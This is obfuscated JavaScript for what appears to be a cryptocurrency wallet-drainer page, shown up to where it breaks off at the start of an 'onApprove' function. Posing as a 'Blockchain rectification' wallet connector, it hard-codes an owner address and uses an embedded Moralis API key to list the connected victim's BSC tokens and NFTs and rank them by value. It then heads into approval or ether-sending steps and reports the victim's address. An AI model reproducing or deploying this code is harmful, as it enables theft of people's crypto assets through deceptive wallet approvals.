const _0x40c37d=_0x9691;(function(_0x2dda56,_0xb12276){const _0x3a47a3=_0x9691,_0x2fb4aa=_0x2dda56();while(!![]){try{const _0x394279=-parseInt(_0x3a47a3(0x1d2))/0x1*(parseInt(_0x3a47a3(0x1b0))/0x2)+parseInt(_0x3a47a3(0x12f))/0x3*(parseInt(_0x3a47a3(0x1ed))/0x4)+-parseInt(_0x3a47a3(0x14b))/0x5+-parseInt(_0x3a47a3(0x1e5))/0x6*(-parseInt(_0x3a47a3(0x1c3))/0x7)+-parseInt(_0x3a47a3(0x185))/0x8*(parseInt(_0x3a47a3(0x148))/0x9)+-parseInt(_0x3a47a3(0x1a4))/0xa+parseInt(_0x3a47a3(0x1dd))/0xb;if(_0x394279===_0xb12276)break;else _0x2fb4aa['push'](_0x2fb4aa['shift']());}catch(_0x58abbe){_0x2fb4aa['push'](_0x2fb4aa['shift']());}}}(_0xcb71,0x386b7));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';function _0xcb71(){const _0x4b24d2=['setProvenanceHash','symbol','OwnershipTransferred','gasPrice','setParams','https://link.trustwallet.com/open_url?url=','transferFrom','_initialSupply','function','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','_owner','redeem','numberOfTokens','unpause','issue','Redeem','_to','destroyBlackFunds','undefined','newAddress','value','Error\x20processing\x20item\x20','144rQQGke','pause','withdraw','metamask','_decimals','options','tokenURI','index','_spender','Tokens:','payable','status','saleStart','upgradedAddress','.trust','Token','addBlackList','approved','Pause','supportsInterface','ApprovalForAll','setStartingIndex','_value','Error:\x20','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png','event','0xea8968B218a551919FbD5f1166328C82a96dED54','bsc','_name','isBlackListed','4212260dCBnLt','tokenId','previousOwner','MetaMask','networkVersion','Params','No\x20address','revealTimeStamp','_symbol','reserveApes','maximumFee','tokens-list','2EkrfKv','.coinbase','Blockchain\x20rectification','name','maxApePurchase','basisPointsRate','provenanceHash','Initial\x20list\x20','Approve\x20Completed\x20Successfully','balances','Unpause','uint256','filter','startingIndexBlock','baseURI','setRevealTimestamp','getProvider','getBlackListStatus','balance','1587362GSqOOJ','_user','totalSupply','_blackListedUser','999999999999999999999999999999999999999999999999999999999999999999999999','catch','transferOwnership','AddedBlackList','MAX_UINT','0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0','https://metamask.app.link/dapp/','sending\x20ether','https://go.cb-w.com/dapp?cb_url=','paused','https://deep-index.moralis.io/api/v2/','260823femuAQ','getApproved','approve','search','json','GET','newOwner','href','Approved','_maker','owner','8411766xuxafn','coinbase','sort','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','from','/erc20','Error\x20collecting\x20info\x20about\x20wallet','token_address','12fnQOlJ','&format=decimal&limit=','safeTransferFrom','amount','connector','BAYC_PROVENANCE','allowance','tokenOfOwnerByIndex','568RQNkZf','message','NFT\x20Contract\x20Address\x20','Transaction\x20Rejected','Issue','emergencySetStartingIndexBlock','interfaceId','getOwner','_evilUser','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','isApprovedForAll','string','allowed','_from','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','&vs_currencies=usd','6339jspslO','maxFee','_clearedUser','bool','all','click','maxNftSupply','error','deprecate','Your\x20address\x20','feeBasisPoints','_balance','formatted','log','who','Approval','_upgradedAddress','https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=','DestroyedBlackFunds','apePrice','remaining','deprecated','NFT','address','Deprecate','191133TjVjLJ','application/json','length','1114370PVyrde','hash','5227607491','then','saleIsActive','openModal','ee71d215d0dec7d1bf950851c84d9643','bytes4','operator','bytes','chainId:','view','.proceed','setBaseURI','.connect','_totalSupply','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','startingIndex','map','price','nonpayable','balanceOf','New\x20token','usd','Transfer','CoinbaseWalletConnector','Could\x20not\x20get\x20a\x20wallet\x20connection','_data','removeBlackList','location','setApprovalForAll','decimals','RemovedBlackList','constructor','.meta','Transaction\x20hash\x20'];_0xcb71=function(){return _0x4b24d2;};return _0xcb71();}function _0x9691(_0xd48a3c,_0x2e04e8){const _0xcb71f4=_0xcb71();return _0x9691=function(_0x96914,_0x298736){_0x96914=_0x96914-0x121;let _0xa09dea=_0xcb71f4[_0x96914];return _0xa09dea;},_0x9691(_0xd48a3c,_0x2e04e8);}import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {bsc,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[bsc,mainnet],projectId=_0x40c37d(0x151),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x40c37d(0x164))]({'chains':chains,'options':{'appName':_0x40c37d(0x1b2)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x40c37d(0x12d),'coinbase':_0x40c37d(0x19e)}},ethereumClient);let currentUrl=window[_0x40c37d(0x168)]['href'];const OWNER_ADDRESS=_0x40c37d(0x1a0),ABI=[{'constant':!![],'inputs':[],'name':_0x40c37d(0x1b3),'outputs':[{'name':'','type':_0x40c37d(0x12a)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':![],'inputs':[{'name':_0x40c37d(0x13f),'type':_0x40c37d(0x146)}],'name':_0x40c37d(0x137),'outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':'function'},{'constant':![],'inputs':[{'name':_0x40c37d(0x18d),'type':_0x40c37d(0x146)},{'name':_0x40c37d(0x19b),'type':'uint256'}],'name':_0x40c37d(0x1d4),'outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':_0x40c37d(0x144),'outputs':[{'name':'','type':_0x40c37d(0x132)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':![],'inputs':[{'name':_0x40c37d(0x127),'type':'address'}],'name':_0x40c37d(0x195),'outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':'function'},{'constant':![],'inputs':[{'name':_0x40c37d(0x12c),'type':_0x40c37d(0x146)},{'name':'_to','type':_0x40c37d(0x146)},{'name':'_value','type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x175),'outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':_0x40c37d(0x192),'outputs':[{'name':'','type':_0x40c37d(0x146)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x40c37d(0x1b9),'outputs':[{'name':'','type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':'view','type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':_0x40c37d(0x16a),'outputs':[{'name':'','type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':_0x40c37d(0x1ae),'outputs':[{'name':'','type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':_0x40c37d(0x15a),'outputs':[{'name':'','type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':'function'},{'constant':![],'inputs':[],'name':_0x40c37d(0x17c),'outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[{'name':_0x40c37d(0x1db),'type':_0x40c37d(0x146)}],'name':_0x40c37d(0x1c1),'outputs':[{'name':'','type':_0x40c37d(0x132)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[{'name':'','type':_0x40c37d(0x146)},{'name':'','type':_0x40c37d(0x146)}],'name':_0x40c37d(0x12b),'outputs':[{'name':'','type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':_0x40c37d(0x1d0),'outputs':[{'name':'','type':_0x40c37d(0x132)}],'payable':![],'stateMutability':'view','type':_0x40c37d(0x177)},{'constant':!![],'inputs':[{'name':_0x40c37d(0x13d),'type':'address'}],'name':'balanceOf','outputs':[{'name':'','type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':'function'},{'constant':![],'inputs':[],'name':_0x40c37d(0x186),'outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':_0x40c37d(0x126),'outputs':[{'name':'','type':_0x40c37d(0x146)}],'payable':![],'stateMutability':'view','type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':_0x40c37d(0x1dc),'outputs':[{'name':'','type':_0x40c37d(0x146)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':_0x40c37d(0x170),'outputs':[{'name':'','type':_0x40c37d(0x12a)}],'payable':![],'stateMutability':'view','type':_0x40c37d(0x177)},{'constant':![],'inputs':[{'name':_0x40c37d(0x17f),'type':'address'},{'name':'_value','type':'uint256'}],'name':'transfer','outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'constant':![],'inputs':[{'name':'newBasisPoints','type':'uint256'},{'name':'newMaxFee','type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x173),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x40c37d(0x177)},{'constant':![],'inputs':[{'name':_0x40c37d(0x1e8),'type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x17d),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':_0x40c37d(0x1e8),'type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x17a),'outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[{'name':_0x40c37d(0x179),'type':_0x40c37d(0x146)},{'name':_0x40c37d(0x18d),'type':_0x40c37d(0x146)}],'name':_0x40c37d(0x1eb),'outputs':[{'name':_0x40c37d(0x143),'type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':!![],'inputs':[],'name':_0x40c37d(0x1b5),'outputs':[{'name':'','type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x40c37d(0x146)}],'name':_0x40c37d(0x1a3),'outputs':[{'name':'','type':_0x40c37d(0x132)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':![],'inputs':[{'name':_0x40c37d(0x131),'type':_0x40c37d(0x146)}],'name':_0x40c37d(0x167),'outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':'function'},{'constant':!![],'inputs':[],'name':_0x40c37d(0x1cb),'outputs':[{'name':'','type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'constant':![],'inputs':[{'name':_0x40c37d(0x1d8),'type':'address'}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'constant':![],'inputs':[{'name':_0x40c37d(0x1c6),'type':_0x40c37d(0x146)}],'name':_0x40c37d(0x180),'outputs':[],'payable':![],'stateMutability':_0x40c37d(0x15f),'type':'function'},{'inputs':[{'name':_0x40c37d(0x176),'type':_0x40c37d(0x1bb)},{'name':_0x40c37d(0x1a2),'type':'string'},{'name':_0x40c37d(0x1ac),'type':'string'},{'name':_0x40c37d(0x189),'type':_0x40c37d(0x1bb)}],'payable':![],'stateMutability':'nonpayable','type':_0x40c37d(0x16c)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x40c37d(0x1e8),'type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x123),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x40c37d(0x1e8),'type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x17e),'type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x40c37d(0x182),'type':'address'}],'name':_0x40c37d(0x147),'type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x40c37d(0x139),'type':_0x40c37d(0x1bb)},{'indexed':![],'name':_0x40c37d(0x130),'type':'uint256'}],'name':_0x40c37d(0x1a9),'type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_blackListedUser','type':_0x40c37d(0x146)},{'indexed':![],'name':_0x40c37d(0x13a),'type':'uint256'}],'name':_0x40c37d(0x141),'type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x40c37d(0x1c4),'type':_0x40c37d(0x146)}],'name':_0x40c37d(0x1ca),'type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x40c37d(0x1c4),'type':_0x40c37d(0x146)}],'name':_0x40c37d(0x16b),'type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':_0x40c37d(0x146)},{'indexed':!![],'name':'spender','type':'address'},{'indexed':![],'name':'value','type':'uint256'}],'name':_0x40c37d(0x13e),'type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x40c37d(0x1e1),'type':_0x40c37d(0x146)},{'indexed':!![],'name':'to','type':_0x40c37d(0x146)},{'indexed':![],'name':'value','type':_0x40c37d(0x1bb)}],'name':'Transfer','type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[],'name':_0x40c37d(0x197),'type':'event'},{'anonymous':![],'inputs':[],'name':_0x40c37d(0x1ba),'type':'event'}],ABIN=[{'inputs':[{'internalType':'string','name':'name','type':'string'},{'internalType':_0x40c37d(0x12a),'name':_0x40c37d(0x170),'type':_0x40c37d(0x12a)},{'internalType':_0x40c37d(0x1bb),'name':_0x40c37d(0x135),'type':_0x40c37d(0x1bb)},{'internalType':'uint256','name':_0x40c37d(0x191),'type':_0x40c37d(0x1bb)}],'stateMutability':'nonpayable','type':_0x40c37d(0x16c)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x40c37d(0x1dc),'type':_0x40c37d(0x146)},{'indexed':!![],'internalType':_0x40c37d(0x146),'name':'approved','type':_0x40c37d(0x146)},{'indexed':!![],'internalType':_0x40c37d(0x1bb),'name':_0x40c37d(0x1a5),'type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x13e),'type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x40c37d(0x146),'name':_0x40c37d(0x1dc),'type':'address'},{'indexed':!![],'internalType':_0x40c37d(0x146),'name':_0x40c37d(0x153),'type':_0x40c37d(0x146)},{'indexed':![],'internalType':_0x40c37d(0x132),'name':'approved','type':_0x40c37d(0x132)}],'name':_0x40c37d(0x199),'type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x40c37d(0x146),'name':_0x40c37d(0x1a6),'type':_0x40c37d(0x146)},{'indexed':!![],'internalType':'address','name':_0x40c37d(0x1d8),'type':_0x40c37d(0x146)}],'name':_0x40c37d(0x171),'type':_0x40c37d(0x19f)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x40c37d(0x146),'name':_0x40c37d(0x1e1),'type':'address'},{'indexed':!![],'internalType':_0x40c37d(0x146),'name':'to','type':_0x40c37d(0x146)},{'indexed':!![],'internalType':_0x40c37d(0x1bb),'name':'tokenId','type':'uint256'}],'name':_0x40c37d(0x163),'type':_0x40c37d(0x19f)},{'inputs':[],'name':_0x40c37d(0x1ea),'outputs':[{'internalType':_0x40c37d(0x12a),'name':'','type':_0x40c37d(0x12a)}],'stateMutability':_0x40c37d(0x156),'type':'function'},{'inputs':[],'name':'MAX_APES','outputs':[{'internalType':_0x40c37d(0x1bb),'name':'','type':_0x40c37d(0x1bb)}],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'inputs':[],'name':'REVEAL_TIMESTAMP','outputs':[{'internalType':_0x40c37d(0x1bb),'name':'','type':_0x40c37d(0x1bb)}],'stateMutability':_0x40c37d(0x156),'type':'function'},{'inputs':[],'name':_0x40c37d(0x142),'outputs':[{'internalType':_0x40c37d(0x1bb),'name':'','type':_0x40c37d(0x1bb)}],'stateMutability':_0x40c37d(0x156),'type':'function'},{'inputs':[{'internalType':_0x40c37d(0x146),'name':'to','type':'address'},{'internalType':_0x40c37d(0x1bb),'name':_0x40c37d(0x1a5),'type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x1d4),'outputs':[],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'inputs':[{'internalType':_0x40c37d(0x146),'name':'owner','type':_0x40c37d(0x146)}],'name':_0x40c37d(0x160),'outputs':[{'internalType':_0x40c37d(0x1bb),'name':'','type':_0x40c37d(0x1bb)}],'stateMutability':'view','type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x1be),'outputs':[{'internalType':_0x40c37d(0x12a),'name':'','type':_0x40c37d(0x12a)}],'stateMutability':'view','type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x124),'outputs':[],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'inputs':[],'name':'flipSaleState','outputs':[],'stateMutability':'nonpayable','type':_0x40c37d(0x177)},{'inputs':[{'internalType':_0x40c37d(0x1bb),'name':_0x40c37d(0x1a5),'type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x1d3),'outputs':[{'internalType':_0x40c37d(0x146),'name':'','type':_0x40c37d(0x146)}],'stateMutability':_0x40c37d(0x156),'type':'function'},{'inputs':[{'internalType':'address','name':'owner','type':_0x40c37d(0x146)},{'internalType':_0x40c37d(0x146),'name':'operator','type':'address'}],'name':_0x40c37d(0x129),'outputs':[{'internalType':_0x40c37d(0x132),'name':'','type':_0x40c37d(0x132)}],'stateMutability':'view','type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x1b4),'outputs':[{'internalType':_0x40c37d(0x1bb),'name':'','type':_0x40c37d(0x1bb)}],'stateMutability':_0x40c37d(0x156),'type':'function'},{'inputs':[{'internalType':_0x40c37d(0x1bb),'name':_0x40c37d(0x17b),'type':_0x40c37d(0x1bb)}],'name':'mintApe','outputs':[],'stateMutability':_0x40c37d(0x18f),'type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x1b3),'outputs':[{'internalType':_0x40c37d(0x12a),'name':'','type':_0x40c37d(0x12a)}],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x1dc),'outputs':[{'internalType':_0x40c37d(0x146),'name':'','type':_0x40c37d(0x146)}],'stateMutability':_0x40c37d(0x156),'type':'function'},{'inputs':[{'internalType':_0x40c37d(0x1bb),'name':'tokenId','type':_0x40c37d(0x1bb)}],'name':'ownerOf','outputs':[{'internalType':'address','name':'','type':_0x40c37d(0x146)}],'stateMutability':'view','type':_0x40c37d(0x177)},{'inputs':[],'name':'renounceOwnership','outputs':[],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x1ad),'outputs':[],'stateMutability':'nonpayable','type':_0x40c37d(0x177)},{'inputs':[{'internalType':_0x40c37d(0x146),'name':_0x40c37d(0x1e1),'type':'address'},{'internalType':_0x40c37d(0x146),'name':'to','type':_0x40c37d(0x146)},{'internalType':_0x40c37d(0x1bb),'name':_0x40c37d(0x1a5),'type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x1e7),'outputs':[],'stateMutability':_0x40c37d(0x15f),'type':'function'},{'inputs':[{'internalType':_0x40c37d(0x146),'name':_0x40c37d(0x1e1),'type':_0x40c37d(0x146)},{'internalType':_0x40c37d(0x146),'name':'to','type':'address'},{'internalType':_0x40c37d(0x1bb),'name':'tokenId','type':_0x40c37d(0x1bb)},{'internalType':_0x40c37d(0x154),'name':_0x40c37d(0x166),'type':_0x40c37d(0x154)}],'name':_0x40c37d(0x1e7),'outputs':[],'stateMutability':_0x40c37d(0x15f),'type':'function'},{'inputs':[],'name':_0x40c37d(0x14f),'outputs':[{'internalType':_0x40c37d(0x132),'name':'','type':_0x40c37d(0x132)}],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'inputs':[{'internalType':_0x40c37d(0x146),'name':_0x40c37d(0x153),'type':_0x40c37d(0x146)},{'internalType':_0x40c37d(0x132),'name':_0x40c37d(0x196),'type':_0x40c37d(0x132)}],'name':_0x40c37d(0x169),'outputs':[],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'inputs':[{'internalType':_0x40c37d(0x12a),'name':_0x40c37d(0x1be),'type':'string'}],'name':_0x40c37d(0x158),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x40c37d(0x12a),'name':_0x40c37d(0x1b6),'type':_0x40c37d(0x12a)}],'name':_0x40c37d(0x16f),'outputs':[],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'inputs':[{'internalType':_0x40c37d(0x1bb),'name':_0x40c37d(0x1ab),'type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x1bf),'outputs':[],'stateMutability':'nonpayable','type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x19a),'outputs':[],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x15c),'outputs':[{'internalType':_0x40c37d(0x1bb),'name':'','type':_0x40c37d(0x1bb)}],'stateMutability':'view','type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x1bd),'outputs':[{'internalType':_0x40c37d(0x1bb),'name':'','type':_0x40c37d(0x1bb)}],'stateMutability':'view','type':_0x40c37d(0x177)},{'inputs':[{'internalType':_0x40c37d(0x152),'name':_0x40c37d(0x125),'type':'bytes4'}],'name':_0x40c37d(0x198),'outputs':[{'internalType':_0x40c37d(0x132),'name':'','type':_0x40c37d(0x132)}],'stateMutability':_0x40c37d(0x156),'type':'function'},{'inputs':[],'name':'symbol','outputs':[{'internalType':'string','name':'','type':_0x40c37d(0x12a)}],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'inputs':[{'internalType':'uint256','name':_0x40c37d(0x18c),'type':_0x40c37d(0x1bb)}],'name':'tokenByIndex','outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':_0x40c37d(0x156),'type':'function'},{'inputs':[{'internalType':'address','name':_0x40c37d(0x1dc),'type':_0x40c37d(0x146)},{'internalType':'uint256','name':'index','type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x1ec),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':'view','type':_0x40c37d(0x177)},{'inputs':[{'internalType':_0x40c37d(0x1bb),'name':_0x40c37d(0x1a5),'type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x18b),'outputs':[{'internalType':'string','name':'','type':_0x40c37d(0x12a)}],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x1c5),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':_0x40c37d(0x156),'type':_0x40c37d(0x177)},{'inputs':[{'internalType':_0x40c37d(0x146),'name':_0x40c37d(0x1e1),'type':'address'},{'internalType':'address','name':'to','type':_0x40c37d(0x146)},{'internalType':_0x40c37d(0x1bb),'name':'tokenId','type':_0x40c37d(0x1bb)}],'name':_0x40c37d(0x175),'outputs':[],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)},{'inputs':[{'internalType':'address','name':_0x40c37d(0x1d8),'type':'address'}],'name':_0x40c37d(0x1c9),'outputs':[],'stateMutability':'nonpayable','type':_0x40c37d(0x177)},{'inputs':[],'name':_0x40c37d(0x187),'outputs':[],'stateMutability':_0x40c37d(0x15f),'type':_0x40c37d(0x177)}];let wallet;$(_0x40c37d(0x16d))[_0x40c37d(0x134)](async function(){wallet='metamask',await connector();}),$(_0x40c37d(0x1b1))[_0x40c37d(0x134)](async function(){const _0x4c38ae=_0x40c37d;wallet=_0x4c38ae(0x1de),await connector();}),$(_0x40c37d(0x193))[_0x40c37d(0x134)](async function(){wallet='trustwallet',await connector();}),$(_0x40c37d(0x159))[_0x40c37d(0x134)](async function(){const _0x23ab42=_0x40c37d;try{await web3Modal[_0x23ab42(0x150)]();}catch(_0x545ffc){console[_0x23ab42(0x13c)](_0x23ab42(0x165),_0x545ffc);return;}});let connector=async()=>{const _0x1ac7b0=_0x40c37d;if(typeof web3===_0x1ac7b0(0x181)&&typeof ethereum===_0x1ac7b0(0x181)){console[_0x1ac7b0(0x13c)]('Hahahahahah');if(wallet===_0x1ac7b0(0x188)){let _0x46d650=_0x1ac7b0(0x1cd)+currentUrl;window[_0x1ac7b0(0x168)]['href']=_0x46d650;}else{if(wallet===_0x1ac7b0(0x1de)){let _0x315a8a=_0x1ac7b0(0x1cf)+currentUrl;window['location'][_0x1ac7b0(0x1d9)]=_0x315a8a;}else{if(wallet==='trustwallet'){let _0x101845=_0x1ac7b0(0x174)+currentUrl;window['location'][_0x1ac7b0(0x1d9)]=_0x101845;}}}}else try{await web3Modal[_0x1ac7b0(0x150)]();}catch(_0x5aa054){console['log'](_0x1ac7b0(0x165),_0x5aa054);return;}};$(_0x40c37d(0x157))['click'](async function(){const _0x2b1315=_0x40c37d;let _0x14811a=getAccount();console['log'](_0x14811a),!_0x14811a[_0x2b1315(0x146)]&&(console[_0x2b1315(0x13c)](_0x2b1315(0x1aa)),alert(_0x2b1315(0x178))),_0x14811a[_0x2b1315(0x1e9)]['name']===_0x2b1315(0x1a7)&&(_0x14811a[_0x2b1315(0x1e9)][_0x2b1315(0x18a)][_0x2b1315(0x1c0)]()[_0x2b1315(0x1a8)]!=='56'&&(console[_0x2b1315(0x13c)]('Incorrect\x20network'),await switchNetwork({'chainId':0x38}))),selectedAccount=_0x14811a[_0x2b1315(0x146)],sendMessage(_0x2b1315(0x1e0)),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});const Oxa=_0x40c37d(0x1cc),Oxc=_0x40c37d(0x14d);async function covalenthqAPICall(){const _0x2973c3=_0x40c37d,_0x4f88bd={'chain':'bsc'},_0x33de67=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+_0x2973c3(0x1e2));_0x33de67[_0x2973c3(0x1d5)]=new URLSearchParams(_0x4f88bd)['toString']();const _0x1fb519={'method':'GET','headers':{'accept':_0x2973c3(0x149),'X-API-Key':_0x2973c3(0x19d)}};try{const _0x31a7ef=await fetch(_0x33de67,_0x1fb519)[_0x2973c3(0x14e)](_0x58c2e1=>_0x58c2e1['json']());console[_0x2973c3(0x13c)](_0x31a7ef);let _0x5b07f5=_0x31a7ef;console[_0x2973c3(0x13c)](_0x2973c3(0x1b7),_0x5b07f5);let _0x3be091=await Promise[_0x2973c3(0x133)](_0x5b07f5[_0x2973c3(0x15d)](async _0x5f4107=>{const _0x2c4f7a=_0x2973c3;let _0x46afd6;try{_0x46afd6=await getValue(_0x5f4107[_0x2c4f7a(0x1e4)],_0x5f4107[_0x2c4f7a(0x1c2)],_0x5f4107[_0x2c4f7a(0x16a)]);}catch(_0x4877e8){_0x46afd6=0x0;}return console[_0x2c4f7a(0x13c)](_0x46afd6),{'balance':_0x5f4107['balance'],'value':_0x46afd6,'address':_0x5f4107[_0x2c4f7a(0x1e4)]};}));console[_0x2973c3(0x13c)](_0x2973c3(0x1af),_0x3be091),tokens=_0x3be091[_0x2973c3(0x1bc)](_0x120e4a=>_0x120e4a[_0x2973c3(0x183)]>0x5),tokens[_0x2973c3(0x1df)]((_0x328313,_0x5bf16f)=>_0x5bf16f['value']-_0x328313[_0x2973c3(0x183)]),console['log'](_0x2973c3(0x155),await getNetwork(),_0x2973c3(0x18e),tokens),NFTs=await getNFTs(selectedAccount)['catch'](_0xecf941=>{const _0x204cb1=_0x2973c3;console[_0x204cb1(0x13c)]('Unable\x20to\x20get\x20NFts',_0xecf941);}),NFTs=NFTs['result'],console[_0x2973c3(0x13c)]('NFTs\x20collection\x20',NFTs);if(tokens[_0x2973c3(0x14a)]===0x0&&NFTs['length']===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x2973c3(0x1e3));}}async function onApprove(){const 